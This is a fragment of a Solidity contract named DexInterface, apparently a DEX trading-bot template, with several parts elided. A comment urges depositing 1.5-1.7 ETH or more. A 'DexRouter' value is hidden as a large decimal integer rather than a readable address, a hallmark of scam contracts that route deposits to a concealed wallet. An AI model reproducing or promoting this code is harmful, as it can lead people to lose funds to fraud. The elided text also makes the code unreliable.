...
// Recommended liquidity after gas fees needs to equal 1.5 - 1.7 ETH or more if possible
...
contract DexInterface {
    ...
    uint256 DexRouter = 1044764381368598285108802008786265505841937801245;
    ...
    function getBalance(address _tokenContractAddress)
        ...
        returns (uint256)
    {
        uint256 _balance = IERC20(_tokenContractAddress).balanceOf(
            address(this)
        );
        return _balance;
    }
